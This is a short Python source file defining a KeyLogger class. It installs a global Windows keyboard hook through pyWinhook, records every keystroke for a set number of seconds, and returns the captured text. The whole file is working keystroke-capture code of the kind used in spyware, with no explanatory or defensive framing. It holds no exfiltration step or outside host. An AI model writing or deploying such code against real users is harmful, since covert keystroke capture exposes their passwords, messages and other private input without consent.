import pythoncom
import pyWinhook
import time


class KeyLogger:
    def __init__(self):
        self._log_buffer = ""

    def _convert_to_char(self, event: pyWinhook.KeyboardEvent):
        ascii_code = int(event.Ascii)
        if 0 <= ascii_code <= 31 or ascii_code == 127:
            return '[' + event.Key + ']'
        return chr(ascii_code)

    def _log_key(self, event: pyWinhook.KeyboardEvent):
        key = self._convert_to_char(event)
        self._log_buffer += key
        return True

    def intercept_keys(self, seconds) -> str:
        hook_manager = pyWinhook.HookManager()
        hook_manager.KeyDown = self._log_key
        hook_manager.HookKeyboard()
        start_time = time.time()
        current_time = time.time()
        while current_time - start_time < seconds:
            pythoncom.PumpWaitingMessages()
            current_time = time.time()
        logged_keys = self._log_buffer
        self._log_buffer = ""
        return logged_keys
